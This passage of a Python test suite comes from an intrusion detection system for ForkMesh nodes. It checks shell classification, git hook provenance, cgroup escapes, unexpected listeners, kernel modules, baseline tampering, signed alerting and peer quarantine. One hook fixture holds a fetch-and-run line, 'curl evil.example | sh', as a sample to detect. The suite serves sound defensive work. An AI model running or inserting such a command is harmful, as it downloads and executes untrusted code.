        "pid 39 /usr/local/bin/forkmesh-mirror-node as forkmesh-node: "
        "/usr/local/bin/forkmesh-mirror-node --config x.json"]
    assert detail["children"] == [
        "pid 42 /usr/bin/curl as forkmesh-node: /usr/bin/curl -fsS -X POST "
        "http://127.0.0.1:8791/v1/control/sync?local=1"]


def test_push_hook_forkmesh_did_not_write_needs_a_look(tmp_path):
    event = push_hook(tmp_path, b"#!/bin/sh\ncurl evil.example | sh\n")
    assert event["summary"].endswith(
        "; needs a look: a post-receive hook ForkMesh did not write ran "
        "during a git push")
    assert "/srv/a.git/hooks/post-receive, which has no ForkMesh marker" in \
        event["detail"]["verdict"]


def test_hook_that_is_not_a_regular_file_is_never_opened(tmp_path):
    event = push_hook(tmp_path, None)
    assert "which could not be read" in event["detail"]["verdict"]


def test_actions_sandbox_self_test_is_likely_benign(tmp_path):
    proc = tmp_path / "proc"
    rich_proc(proc, 50, "/usr/bin/bwrap", ["bwrap", "--unshare-all", "--"])
    rich_proc(proc, 51, "/usr/bin/dash", ["/bin/sh", "-c", "exit 0"],
              ppid=50, cwd="/", name="sh")
    event = shell_event(node_monitor(tmp_path).scan(), 51)
    assert event["summary"].endswith(
        "; likely benign: the Actions sandbox self-test")
    assert "(bwrap pid 50)" in event["detail"]["verdict"]


def test_unexplained_shell_carries_ip_environment_and_start(tmp_path):
    proc = tmp_path / "proc"
    clock = os.sysconf("SC_CLK_TCK")
    (proc / "net").mkdir(parents=True)
    (proc / "stat").write_text("cpu 0\nbtime 1790000000\n")
    rich_proc(proc, 59, "/usr/local/bin/forkmesh-mirror-node",
              ["/usr/local/bin/forkmesh-mirror-node"])
    d = rich_proc(proc, 60, "/usr/bin/dash", ["sh", "-i"], ppid=59,
                  cwd="/var/lib/forkmesh", name="sh",
                  env={"SSH_CONNECTION": "203.0.113.9 50000 198.51.100.1 22",
                       "DATA_KEY": "s3cr3t", "HOME": "/var/lib/forkmesh"})
    (d / "stat").write_text("60 (sh) " + " ".join(
        ["S"] + ["0"] * 18 + [str(5 * clock)] + ["0"] * 10) + "\n")
    (d / "fd").mkdir()
    os.symlink("socket:[777]", d / "fd" / "3")
    os.symlink("/dev/null", d / "fd" / "0")
    (d / "net").mkdir()
    (d / "net" / "tcp").write_text(
        "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when "
        "retrnsmt   uid  timeout inode\n"
        "   0: 0100007F:1F97 097100CB:01BB 01 00000000:00000000 00:00000000 "
        "00000000   997        0 777 1 0 20 4 30 10 -1\n")
    event = shell_event(node_monitor(tmp_path).scan(), 60)
    detail = event["detail"]
    assert event["summary"].endswith(
        "; unexplained: no known ForkMesh source matches")
    assert detail["verdict"].startswith("Unexplained. No known ForkMesh source")
    assert detail["environment"] == {
        "SSH_CONNECTION": "203.0.113.9 50000 198.51.100.1 22"}
    assert "s3cr3t" not in json.dumps(event)
    assert detail["connections"] == [
        "pid 60 tcp 127.0.0.1:8087 -> 203.0.113.9:443 established"]
    assert detail["started"].startswith("2026-09-21 14:13:25 UTC (")


def test_shell_gone_before_the_ids_reads_it_says_so(tmp_path):
    proc = tmp_path / "proc"
    fake_proc(proc, 70, 997, "/usr/bin/dash", MIRROR, name="sh")
    event = shell_event(node_monitor(tmp_path).scan(), 70)
    assert event["summary"].endswith(
        "; unexplained: it exited before the IDS could read it")


def test_context_is_trimmed_to_stay_valid_json_in_the_record():
    detail = {"pid": 1, "verdict": "v" * 300, "cmdline": "c" * 300,
              "parents": ["p%d " % n + "x" * 250 for n in range(6)],
              "children": ["k" * 250] * 5,
              "connections": ["n" * 80] * 10,
              "environment": {"K%d" % n: "e" * 160 for n in range(12)}}
    ids.fit_detail(detail)
    assert len(json.dumps(detail, sort_keys=True)) <= ids.CONTEXT_BYTES
    assert "children" not in detail and detail["parents"][0].startswith("p0 ")
    assert detail["verdict"] == "v" * 300


def outside_pids(events):
    return sorted(e["detail"]["pid"] for e in events
                  if e["detector"] in ("service_user_outside_unit",
                                       "job_user_outside_scope"))


def test_vanished_process_is_not_outside_its_unit(tmp_path, monkeypatch):
    proc = tmp_path / "proc"
    fake_proc(proc, 30, 997, "/usr/lib/git-core/git", "x", name="git")
    fake_proc(proc, 31, 996, "/usr/bin/bash", "x")
    fake_proc(proc, 32, 997, "/tmp/.x", "x", name="x")
    real_read = ids._read

    def racing_read(path, limit=65536):
        if path.endswith("/cgroup"):
            pid_dir = os.path.dirname(path)
            assert pid_dir.startswith(str(tmp_path))
            shutil.rmtree(pid_dir)
            return None
        return real_read(path, limit)

    monkeypatch.setattr(ids, "_read", racing_read)
    events = proc_monitor(tmp_path).scan()
    assert outside_pids(events) == []
    assert ("exe_suspicious_path", "lockdown") in codes(events)


def test_vanished_process_of_a_unitless_user_still_alerts(tmp_path,
                                                         monkeypatch):
    proc = tmp_path / "proc"
    fake_proc(proc, 35, 997, "/usr/bin/git", "x", name="git")
    real_read = ids._read

    def racing_read(path, limit=65536):
        if path.endswith("/cgroup"):
            pid_dir = os.path.dirname(path)
            assert pid_dir.startswith(str(tmp_path))
            shutil.rmtree(pid_dir)
            return None
        return real_read(path, limit)

    monkeypatch.setattr(ids, "_read", racing_read)
    runner = {"processes": {"service_users": {
        "forkmesh-node": {"units": ["-"], "outside_severity": "alert"}}}}
    monitor = ids.ProcessMonitor(dict(cfg(tmp_path), **runner),
                                 proc=str(proc),
                                 user_of=lambda uid: USERS.get(uid, str(uid)))
    assert outside_pids(monitor.scan()) == [35]


def test_zombie_in_root_cgroup_is_not_outside_its_unit(tmp_path):
    proc = tmp_path / "proc"
    fake_proc(proc, 33, 997, "/usr/bin/git", "x", name="git")
    status = proc / "33" / "status"
    status.write_text(status.read_text() + "State:\tZ (zombie)\n")
    (proc / "33" / "cgroup").write_text("0::/\n")
    assert outside_pids(proc_monitor(tmp_path).scan()) == []


def test_cgroup_reread_when_first_read_races(tmp_path, monkeypatch):
    proc = tmp_path / "proc"
    fake_proc(proc, 34, 997, "/usr/bin/git", "forkmesh-mirror-node.service",
              name="git")
    real_read = ids._read
    calls = []

    def flaky_read(path, limit=65536):
        if path.endswith("/cgroup") and not calls:
            calls.append(path)
            return None
        return real_read(path, limit)

    monkeypatch.setattr(ids, "_read", flaky_read)
    assert outside_pids(proc_monitor(tmp_path).scan()) == []
    assert calls


def test_service_user_outside_unit_still_alerts(tmp_path):
    proc = tmp_path / "proc"
    fake_proc(proc, 40, 997, "/usr/bin/git",
              "forkmesh-mirror-node.service/child", name="git")
    fake_proc(proc, 41, 997, "/usr/bin/git", "x", name="git")
    (proc / "41" / "cgroup").write_text(
        "0::/user.slice/user-0.slice/session-7.scope\n")
    fake_proc(proc, 42, 997, "/usr/bin/git", "x", name="git")
    (proc / "42" / "cgroup").write_text(
        "0::/user.slice/user-997.slice/user@997.service/app.slice/x.service\n")
    fake_proc(proc, 43, 997, "/usr/bin/git", "cron.service", name="git")
    fake_proc(proc, 44, 997, "/usr/bin/git", "x", name="git")
    (proc / "44" / "cgroup").write_text("0::/\n")
    fake_proc(proc, 45, 997, "/usr/bin/git", "x", name="git")
    os.unlink(proc / "45" / "cgroup")
    fake_proc(proc, 46, 996, "/usr/bin/bash", "x")
    (proc / "46" / "cgroup").write_text("0::/\n")
    fake_proc(proc, 47, 997, "/usr/bin/git", "x", name="git")
    (proc / "47" / "cgroup").write_text(
        "0::/user.slice/user-997.slice/user@997.service/app.slice/"
        "forkmesh-mirror-node.service\n")
    fake_proc(proc, 48, 997, "/usr/bin/git",
              "forkmesh-mirror-node.service/git.scope", name="git")
    events = proc_monitor(tmp_path).scan()
    assert outside_pids(events) == [41, 42, 43, 44, 45, 46, 47]
    spoofed = [e for e in events if e["detail"]["pid"] == 47][0]
    assert spoofed["detail"]["system_unit"] == "user@997.service"
    assert "(user@997.service)" in spoofed["summary"]



def test_systemd_executor_starting_a_unit_is_not_unexpected(tmp_path):
    proc = tmp_path / "proc"
    fake_proc(proc, 50, 998, "/usr/lib/systemd/systemd-executor",
              "forkmesh-app.service", name="(python3)")
    fake_proc(proc, 51, 997, "/lib/systemd/systemd-executor",
              "forkmesh-mirror-node.service", name="(forkmesh-)")
    fake_proc(proc, 52, 998, "/usr/lib/systemd/systemd-executor",
              "forkmesh-app.service", name="systemd-executo")
    fake_proc(proc, 53, 998, "/usr/lib/systemd/systemd-executor",
              "cron.service", name="(python3)")
    fake_proc(proc, 54, 998, "/usr/local/bin/x", "forkmesh-app.service",
              name="(python3)")
    events = proc_monitor(tmp_path).scan()
    found = sorted(e["detail"]["pid"] for e in events
                   if e["detector"] == "service_user_exe")
    assert found == [52, 53, 54]

def test_listeners(tmp_path):
    net = tmp_path / "net"
    net.mkdir()
    header = "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n"
    (net / "tcp").write_text(header +
        "   0: 0100007F:1F90 00000000:0000 0A 00000000:00000000 00:00000000 00000000   998        0 1\n"
        "   1: 00000000:115C 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 2\n"
        "   2: 0100007F:1F90 0100007F:D431 01 00000000:00000000 00:00000000 00000000   998        0 3\n")
    (net / "udp").write_text(header +
        "   0: 00000000:CA6C 00000000:0000 07 00000000:00000000 00:00000000 00000000     0        0 4\n"
        "   1: 00000000:0277 00000000:0000 07 00000000:00000000 00:00000000 00000000     0        0 5\n")
    sockets = ids.listening_sockets(str(net))
    assert ("tcp", 8080, 998) in sockets and ("tcp", 4444, 0) in sockets
    assert all(port != 54321 for _, port, _ in sockets)  # established
    events = ids.listener_events(sockets, {"listeners": {
        "tcp": [8080], "udp": [], "udp_max_port": 10240}})
    assert sorted(e["detail"]["port"] for e in events) == [631, 4444]


def test_listener_names_address_and_owner(tmp_path):
    net = tmp_path / "net"
    net.mkdir()
    header = "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n"
    (net / "tcp").write_text(header +
        "   0: 0100007F:0019 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 812\n")
    (net / "tcp6").write_text(header +
        "   0: 00000000000000000000000001000000:0019 00000000000000000000000000000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 813\n")
    proc = tmp_path / "proc"
    (proc / "700" / "fd").mkdir(parents=True)
    (proc / "700" / "status").write_text(
        "Name:\texim4\nPPid:\t1\nUid:\t0\t0\t0\t0\n")
    (proc / "700" / "cgroup").write_text("0::/system.slice/exim4.service\n")
    os.symlink("/usr/sbin/exim4", proc / "700" / "exe")
    os.symlink("socket:[812]", proc / "700" / "fd" / "3")
    os.symlink("socket:[813]", proc / "700" / "fd" / "4")
    os.symlink("/dev/null", proc / "700" / "fd" / "0")
    rows = ids.listening_rows(str(net))
    assert ("tcp", 25, 0, "127.0.0.1", "812") in rows
    assert ("tcp", 25, 0, "::1", "813") in rows
    assert ids.listening_sockets(str(net)) == [("tcp", 25, 0)]
    events = ids.listener_events(rows, {"listeners": {"tcp": []}},
                                 proc=str(proc))
    assert len(events) == 1
    event = events[0]
    assert event["key"] == "listen:tcp:25:0"
    assert event["detail"]["addresses"] == ["127.0.0.1", "::1"]
    assert event["detail"]["processes"] == [{
        "pid": 700, "name": "exim4", "exe": "/usr/sbin/exim4",
        "unit": "exim4.service", "ppid": 1}]
    assert event["summary"] == (
        "root listens on tcp port 25 on 127.0.0.1, ::1 (loopback only) "
        "by exim4 pid 700 in exim4.service")


def test_loopback_allow_sign_in_callback(tmp_path):
    proc = tmp_path / "proc"
    for pid, unit, inode in ((900, "run-p900-i901.scope", "70"),
                             (910, "fmnext-job-ab.scope", "71")):
        fake_proc(proc, pid, os.getuid(), "/usr/local/lib/claude/claude",
                  unit, name="claude")
        (proc / str(pid) / "fd").mkdir()
        os.symlink("socket:[%s]" % inode, proc / str(pid) / "fd" / "3")
    user = ids.uid_name(os.getuid())
    cfg = {"listeners": {"tcp": [], "loopback_allow": [
        {"user": user, "units": ["run-*.scope"],
         "exe": ["/usr/local/lib/claude/claude"]}]}}
    uid = os.getuid()
    rows = [("tcp", 34259, uid, "127.0.0.1", "70"),
            ("tcp", 34260, uid, "0.0.0.0", "70"),
            ("tcp", 34261, uid, "127.0.0.1", "71")]
    events = ids.listener_events(rows, cfg, proc=str(proc))
    assert sorted(e["detail"]["port"] for e in events) == [34260, 34261]
    other = {"listeners": {"tcp": [], "loopback_allow": [
        dict(cfg["listeners"]["loopback_allow"][0], user="someone-else")]}}
    events = ids.listener_events(rows[:1], other, proc=str(proc))
    assert [e["detail"]["port"] for e in events] == [34259]


def test_loopback_allow_job_go_test_binary(tmp_path):
    fleet = render.load_fleet(os.path.join(REPO, "deploy",
                                           "fleet.example.toml"),
                              state_path=tmp_path / "none.json")
    runner = json.loads(render.ids_config(fleet, "r1", "runner",
                                          render.fleet_paths(fleet)))
    rules = runner["listeners"]["loopback_allow"]
    for rule in rules:
        rule["user"] = ids.uid_name(os.getuid())
    work = render.RUNNER_WORK_ROOT
    owners = (
        (920, "fmnext-job-9311f5b54f04159b.scope",
         work + "/.tmp/fmnext-job-9311f5b54f04159b/go-build1/b001/"
         "mirror-node.test", "80"),
        (921, "fmnext-job-ab.scope", "/tmp/go-build2/b001/server.test", "81"),
        (922, "fmnext-job-ab.scope", work + "/.tmp/x/evil", "82"),
        (923, "forkmesh-mirror-node.service",
         work + "/.tmp/x/go-build3/b001/mirror-node.test", "83"),
        (924, "fmnext-job-ab.scope", "/home/x/mirror-node.test", "84"))
    proc = tmp_path / "proc"
    for pid, unit, exe, inode in owners:
        fake_proc(proc, pid, os.getuid(), exe, unit, name="mirror-node.tes")
        (proc / str(pid) / "fd").mkdir()
        os.symlink("socket:[%s]" % inode, proc / str(pid) / "fd" / "3")
    uid = os.getuid()
    rows = [("tcp", 14259, uid, "127.0.0.1", "80"),
            ("tcp", 14260, uid, "::1", "81"),
            ("tcp", 14261, uid, "0.0.0.0", "80"),
            ("tcp", 14262, uid, "127.0.0.1", "82"),
            ("tcp", 14263, uid, "127.0.0.1", "83"),
            ("tcp", 14264, uid, "127.0.0.1", "84")]
    events = ids.listener_events(rows, {"listeners": {
        "tcp": [], "loopback_allow": rules}}, proc=str(proc))
    assert sorted(e["detail"]["port"] for e in events) == [
        14261, 14262, 14263, 14264]


# --------------------------------------------------------------------------
# alert fan-out


class FakeResponse:
    def __init__(self, body=b'{"ok": true, "id": "i1"}', status=200):
        self.status, self._body = status, body

    def read(self):
        return self._body

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        return False


def incident(severity="alert"):
    return {"id": "abc123def456", "node": "n1", "ts": 1, "severity": severity,
            "detector": "x", "summary": "summary", "detail": {"a": 1}}


def test_alerter_fan_out_core(tmp_path, capsys):
    requests = []

    def opener(request, timeout=None):
        requests.append(request)
        return FakeResponse(status=202)
    creds = {"FMNEXT_IDS_MAIL_TOKEN": "mail-SECRET", "FMNEXT_IDS_ALERT_EMAIL":
             "ops@example.com"}
    rq = FakeRqlite()
    config = cfg(tmp_path, mail={"token_credential": "FMNEXT_IDS_MAIL_TOKEN",
                                 "to_credential": "FMNEXT_IDS_ALERT_EMAIL"},
                 webhook={"url": "https://desktop.example/ids"})
    alerter = ids.Alerter(config, rq, opener=opener,
                          credential=lambda name: creds.get(name, ""))
    result = alerter.send(incident("alert"), key=KEY)
    assert result["rqlite"] == (True, "recorded")
    assert "mail" not in result          # recorded: the peers page the admins
    assert result["webhook"][0] is True
    webhook = requests[-1]
    ts, mac = webhook.headers["X-fmnext-ids-signature"].split(":")[1:]
    import hmac as _hmac
    wkey = _hmac.new(KEY.encode(), b"fmnext-ids-webhook-v1",
                     hashlib.sha256).digest()
    assert mac == _hmac.new(wkey, ts.encode() + b"\n" + webhook.data,
                            hashlib.sha256).hexdigest()
    # Lockdown (and test) incidents also go out by direct mail.
    result = alerter.send(incident("lockdown"), key=KEY)
    assert result["mail"][0] is True
    mail = [r for r in requests if "mailtrap" in r.full_url][-1]
    assert mail.headers["Authorization"] == "Bearer mail-SECRET"
    assert json.loads(mail.data)["to"] == [{"email": "ops@example.com"}]
    # The journal line never carries a credential.
    assert "mail-SECRET" not in capsys.readouterr().out


def test_alerter_falls_back_to_mail_when_rqlite_is_down(tmp_path):
    class DownRqlite(FakeRqlite):
        def execute(self, statements, local_only=False):
            raise OSError("rqlite unreachable")
    sent = []

    def opener(request, timeout=None):
        sent.append(request.full_url)
        return FakeResponse(status=200)
    alerter = ids.Alerter(cfg(tmp_path, mail={"token_credential": "T",
                                              "to_credential": "E"}),
                          DownRqlite(), opener=opener,
                          credential=lambda n: {"T": "t", "E": "a@b.c"}[n])
    result = alerter.send(incident("alert"))
    assert result["rqlite"][0] is False and result["mail"][0] is True


def test_alerter_runner_posts_signed(tmp_path):
    posted = []

    def opener(request, timeout=None):
        posted.append(request)
        return FakeResponse()
    alerter = ids.Alerter(cfg(tmp_path, role="runner", runner={
        "app_url": "https://app.next.forkmesh.com"}), None, opener=opener,
        sign_request=lambda path, body: {"x-forkmesh-node": "fmnext-r1",
                                         "x-forkmesh-signature": "sig"})
    result = alerter.send(incident("alert"))
    assert result["api"][0] is True
    assert posted[0].full_url == ("https://app.next.forkmesh.com/api/runners/"
                                  "security-incident")
    assert posted[0].headers["X-forkmesh-signature"] == "sig"


def test_runner_signer_matches_the_app_verifier(tmp_path):
    pytest.importorskip("cryptography")
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.primitives.asymmetric.ed25519 import \
        Ed25519PrivateKey
    key = Ed25519PrivateKey.generate()
    pem = tmp_path / "ed25519.pem"
    pem.write_bytes(key.private_bytes(serialization.Encoding.PEM,
                                      serialization.PrivateFormat.PKCS8,
                                      serialization.NoEncryption()))
    sign = ids.runner_signer({"runner": {"identity": str(pem),
                                         "node_name": "fmnext-r1"}})
    body = b'{"x":1}'
    headers = sign("/api/runners/security-incident", body)
    import sys
    sys.path.insert(0, os.path.join(REPO, "app", "src"))
    import edge_routing
    message = edge_routing.request_message(
        "fmnext-r1", "POST", "/api/runners/security-incident",
        hashlib.sha256(body).hexdigest(), headers["x-forkmesh-request-id"],
        headers["x-forkmesh-issued-at"])
    key.public_key().verify(ids_records.unb64u(
        headers["x-forkmesh-signature"]), message.encode())


# --------------------------------------------------------------------------
# peers: IDS heartbeats, votes, enforcement


def keypairs():
    private = {n: ids_records.generate_private() for n in ("n1", "n2", "n3")}
    public = {n: ids_records.public_key(k) for n, k in private.items()}
    return private, public


def peer(tmp_path, node, rq, private, public, now):
    config = cfg(tmp_path / node, node=node, node_public_keys=public)
    os.makedirs(config["state_dir"], exist_ok=True)
    store = ids.StateStore(os.path.join(config["state_dir"], "state.json"))
    r = ids.Responder(config, FakeActions(), FakeAlerter(), store, KEY,
                      lambda: private[node], rq)
    return ids.PeerWatch(config, rq, r, lambda: private[node],
                         clock=lambda: now), r


def test_silent_ids_is_voted_into_quarantine_by_a_majority(tmp_path):
    private, public = keypairs()
    rq = FakeRqlite(VOTERS_OK)
    now = 10_000_000
    started = now - 3_600_000
    rq.tables["cluster_members"] = [
        {"node_id": n, "heartbeat_ms": now - 2000, "epoch": started,
         "status": "active"} for n in ("n1", "n2", "n3")]
    rq.tables["ids_heartbeats"] = [
        {"node_id": "n1", "beat_ms": now}, {"node_id": "n2", "beat_ms": now},
        {"node_id": "n3", "beat_ms": now - 600_000}]   # silent for 10 min
    w1, r1 = peer(tmp_path, "n1", rq, private, public, now)
    events, state = w1.round()
    assert codes(events) == [("peer_ids_silent", "alert")]
    assert not state.get("n3", {}).get("quarantined")   # one vote: not yet
    # A second round from the same voter does not count twice.
    w1.round()
    w2, r2 = peer(tmp_path, "n2", rq, private, public, now)
    events, state = w2.round()
    assert state["n3"]["quarantined"]
    assert r2.state["quarantined"] == ["n3"]
    assert w2.blocked_ips(["n3"]) == ["10.77.0.3"]
    # The silent node itself, if its IDS comes back, locks itself down.
    w3, r3 = peer(tmp_path, "n3", rq, private, public, now)
    events, _ = w3.round()
    assert ("quarantined_by_peers", "lockdown") in codes(events)


def test_a_single_compromised_node_cannot_quarantine_a_peer(tmp_path):
    private, public = keypairs()
    rq = FakeRqlite(VOTERS_OK)
    now = 10_000_000
    # n1 (compromised) forges: a vote as itself, a vote signed with its own
    # key but claiming to be n3, and a "self" row for n2 signed by n1.
    body = ids_records.vote_body("n1", "n2", now, "x")
    rq.tables["cluster_quarantine"].append(ids_records.make_row(
        "vote", "n2", "n1", body, ids_records.sign(private["n1"], "vote",
                                                   body)))
    body3 = ids_records.vote_body("n3", "n2", now, "x")
    rq.tables["cluster_quarantine"].append(ids_records.make_row(
        "vote", "n2", "n3", body3, ids_records.sign(private["n1"], "vote",
                                                    body3)))
    self_body = ids_records.self_body("n2", now, "i", "x")
    rq.tables["cluster_quarantine"].append(ids_records.make_row(
        "self", "n2", "n2", self_body, ids_records.sign(
            private["n1"], "self", self_body)))
    state = ids_records.quarantine_state(rq.tables["cluster_quarantine"],
                                         public, "", ["n1", "n2", "n3"])
    assert not state["n2"]["quarantined"]
    assert state["n2"]["invalid"] == 2


def test_unwatched_until_the_ids_has_reported(tmp_path):
    private, public = keypairs()
    rq = FakeRqlite(VOTERS_OK)
    now = 10_000_000
    rq.tables["cluster_members"] = [
        {"node_id": n, "heartbeat_ms": now, "epoch": 1, "status": "active"}
        for n in ("n1", "n2", "n3")]
    rq.tables["ids_heartbeats"] = [{"node_id": "n1", "beat_ms": now}]
    w1, _ = peer(tmp_path, "n1", rq, private, public, now)
    events, _ = w1.round()
    assert events == []     # n2/n3 never ran the IDS (first rollout)


def test_voter_removal_is_quorum_safe(tmp_path):
    private, public = keypairs()
    now = 10_000_000
    nodes = [{"id": "n1", "voter": True, "reachable": True},
             {"id": "n2", "voter": True, "reachable": True, "leader": True},
             {"id": "n3", "voter": True, "reachable": False}]
    rq = FakeRqlite(nodes)
    clock = {"now": now}
    config = cfg(tmp_path, node="n1", node_public_keys=public)
    os.makedirs(config["state_dir"], exist_ok=True)
    r = ids.Responder(config, FakeActions(), FakeAlerter(),
                      ids.StateStore(os.path.join(config["state_dir"], "s")),
                      KEY, None, rq)
    watch = ids.PeerWatch(config, rq, r, None, clock=lambda: clock["now"])
    chosen = sorted(["n1", "n2"], key=lambda n: hashlib.sha256(
        ("ids:remove:n3:%s" % n).encode()).digest(), reverse=True)[0]
    watch.node = chosen
    assert watch.maybe_remove_voter(["n3"]) == []      # just went away
    clock["now"] += 121_000
    events = watch.maybe_remove_voter(["n3"])
    assert rq.removed == ["n3"] and codes(events) == [("voter_removed",
                                                       "alert")]
    # Never below two voters, never without a leader.
    rq2 = FakeRqlite([{"id": "n1", "voter": True, "reachable": True,
                       "leader": True},
                      {"id": "n3", "voter": True, "reachable": False}])
    watch2 = ids.PeerWatch(dict(config), rq2, r, None,
                           clock=lambda: clock["now"])
    watch2.unreachable_since["n3"] = 0
    assert watch2.maybe_remove_voter(["n3"]) == [] and rq2.removed == []


# --------------------------------------------------------------------------
# the rendered config drives a real Daemon object


def test_rendered_config_loads(tmp_path):
    fleet = render.load_fleet(os.path.join(REPO, "deploy",
                                           "fleet.example.toml"),
                              state_path=tmp_path / "none.json")
    for name, role in (("n1", "core"), ("r1", "runner")):
        text = render.ids_config(fleet, name, role, render.fleet_paths(fleet))
        path = tmp_path / ("%s.json" % name)
        path.write_text(text)
        config = ids.load_config(str(path))
        assert config["node"] == name and config["role"] == role
        assert "/usr/local/bin" in config["integrity"]["lockdown"]
    core = json.loads(render.ids_config(fleet, "n1", "core",
                                        render.fleet_paths(fleet)))
    assert core["integrity"]["trees"] == ["/opt/forkmesh-next/app/current"]
    assert core["lockdown"]["core_wg_ips_by_node"]["n2"] == "10.77.0.2"
    assert core["rqlite"]["url"] == "http://127.0.0.1:4001"


def test_daemon_control_expect_and_baseline_mac(tmp_path, monkeypatch):
    creds = tmp_path / "creds"
    creds.mkdir()
    (creds / "FMNEXT_IDS_KEY").write_text(KEY)
    root = tmp_path / "fs"
    make_tree(root)
    config = integrity_cfg(tmp_path)
    config["role"] = "runner"   # no rqlite in this test
    daemon = ids.Daemon(config, environ={"CREDENTIALS_DIRECTORY": str(creds)})
    daemon.integrity = ids.Integrity(config, root_prefix=str(root))
    daemon.responder.alerter = FakeAlerter()
    daemon.responder.actions = FakeActions()
    daemon.init_baseline()
    assert daemon.load_baseline() == daemon.baseline
    # A forged manifest (another node's key) is refused and reported.
    import next_ids
    forged = next_ids.build_manifest("n1", "wrong-key", rescan=["/usr"])
    reply = daemon.control_request({"command": "expect", "manifest": forged})
    assert reply == {"ok": False, "error": "bad_mac"}
    assert daemon.responder.alerter.sent[-1]["detector"] == \
        "expectation_rejected"
    good = next_ids.build_manifest("n1", KEY, rescan=["/usr/local/bin"])
    assert daemon.control_request({"command": "expect", "manifest": good})[
        "ok"]
    # Replay is refused.
    assert daemon.control_request({"command": "expect", "manifest": good})[
        "error"] == "replayed"
    (root / "usr/local/bin/rqlited").write_text("new build")
    assert daemon.integrity_round("normal") == []
    # Tampering with the stored baseline is itself a lockdown.
    data = json.loads(open(daemon.baseline_path).read())
    data["entries"]["/usr/local/bin/evil"] = ["00", 0o755, 0, 0]
    open(daemon.baseline_path, "w").write(json.dumps(data))
    daemon2 = ids.Daemon(config, environ={"CREDENTIALS_DIRECTORY":
                                          str(creds)})
    daemon2.integrity = daemon.integrity
    daemon2.responder.alerter = FakeAlerter()
    daemon2.responder.actions = FakeActions()
    daemon2.init_baseline()
    assert daemon2.responder.lockdown
    assert daemon2.responder.alerter.sent[0]["detector"] == \
        "baseline_tampered"


def test_lockdown_firewall_covers_ipv6():
    locked = ids.firewall_ruleset(lockdown=True, ssh_allow=["192.0.2.1"])
    assert "meta nfproto ipv6 tcp dport 22 drop" in locked
    assert locked.index("meta nfproto ipv6 tcp dport 22 drop") < \
        locked.index("tcp dport 22 accept")
    assert "meta l4proto ipv6-icmp accept" in locked
    open_ssh = ids.firewall_ruleset(lockdown=True)
    assert "nfproto ipv6" not in open_ssh
    assert "meta l4proto ipv6-icmp accept" in open_ssh


def test_socket_diag_modules_loaded_by_ss_are_expected(tmp_path, monkeypatch):
    fleet = render.load_fleet(os.path.join(REPO, "deploy",
                                           "fleet.example.toml"),
                              state_path=tmp_path / "none.json")
    for name, role in (("n1", "core"), ("r1", "runner")):
        path = tmp_path / ("%s.json" % name)
        path.write_text(render.ids_config(fleet, name, role,
                                          render.fleet_paths(fleet)))
        config = ids.load_config(str(path))
        assert {"inet_diag", "tcp_diag", "dm_mod"} <= set(
            config["modules"]["expected"])
    config = integrity_cfg(tmp_path)
    config["role"] = "runner"
    config["modules"] = {"expected": ["inet_diag", "tcp_diag", "dm_mod"]}
    creds = tmp_path / "creds"
    creds.mkdir()
    (creds / "FMNEXT_IDS_KEY").write_text(KEY)
    daemon = ids.Daemon(config, environ={"CREDENTIALS_DIRECTORY": str(creds)})
    loaded = {"ext4", "wireguard"}
    monkeypatch.setattr(ids, "loaded_modules", lambda: set(loaded))
    daemon.modules = set(loaded)
    loaded |= {"inet_diag", "tcp_diag", "dm_mod"}
    assert daemon.module_round() == []
    loaded.add("evil")
    events = daemon.module_round()
    assert [e["detector"] for e in events] == ["kernel_module_loaded"]
    assert events[0]["detail"]["modules"] == ["evil"]


def test_direct_mail_leaves_a_masked_email_log_note_on_a_core(tmp_path):
    def opener(request, timeout=None):
        return FakeResponse(status=200)
    rq = FakeRqlite()
    alerter = ids.Alerter(cfg(tmp_path, mail={"token_credential": "T",
                                              "to_credential": "E"}),
                          rq, opener=opener,
                          credential=lambda n: {"T": "t", "E": "ops@example.com"}[n])
    assert alerter.mail(incident("lockdown"))[0] is True
    notes = [s for s in rq.statements if "mail_log_node_notes" in s[0]]
    assert len(notes) == 1 and notes[0][2] == "n1"
    note = json.loads(notes[0][3])
    assert note["to"] == "o***@example.com" and note["result"] == "accepted"
    assert note["kind"] == "ids_direct" and "ops@" not in notes[0][3]
    assert json.loads(note["body"])["detector"] == incident(
        "lockdown")["detector"]


def test_failed_direct_mail_is_noted_too_and_runners_use_the_webhook(tmp_path):
    posted = []

    def opener(request, timeout=None):
        posted.append(request)
        if "mailtrap" in request.full_url:
            raise OSError("no route")
        return FakeResponse()
    alerter = ids.Alerter(cfg(tmp_path, role="runner", runner={
        "app_url": "https://app.next.forkmesh.com"},
        mail={"token_credential": "T", "to_credential": "E"}), None,
        opener=opener, credential=lambda n: {"T": "t", "E": "a@b.co"}[n],
        sign_request=lambda path, body: {"x-forkmesh-signature": "sig"})
    assert alerter.mail(incident("lockdown"))[0] is False
    hook = posted[-1]
    assert hook.full_url.endswith("/api/runners/mail-log-note")
    assert json.loads(hook.data)["result"] == "failed"
    assert json.loads(hook.data)["to"] == "a***@b.co"


class FakeSmtp:
    def __init__(self, sent, fail=None, refused=None):
        self.sent, self.fail, self.refused = sent, fail, refused or {}

    def __call__(self, host, port, timeout=None):
        if self.fail:
            raise self.fail
        self.sent.append({"host": host, "port": port})
        return self

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        return False

    def send_message(self, message, from_addr=None, to_addrs=None):
        self.sent[-1].update(message=message, from_addr=from_addr,
                             to_addrs=to_addrs)
        return self.refused


def postfix_mail(tmp_path, token="mt-SECRET"):
    path = tmp_path / "sasl_passwd"
    path.write_text("[live.smtp.mailtrap.io]:587 api:%s\n" % token)
    return {"to": "security@example.com", "from": "", "smtp": "127.0.0.1:25",
            "token_file": str(path)}


def lock_down(tmp_path):
    state = tmp_path / "state"
    state.mkdir(parents=True, exist_ok=True)
    (state / "LOCKDOWN").write_text("x")


def test_direct_mail_goes_through_the_local_postfix(tmp_path, capsys):
    sent, posted = [], []
    rq = FakeRqlite()
    alerter = ids.Alerter(cfg(tmp_path, mail=postfix_mail(tmp_path)), rq,
                          opener=lambda request, timeout=None: posted.append(
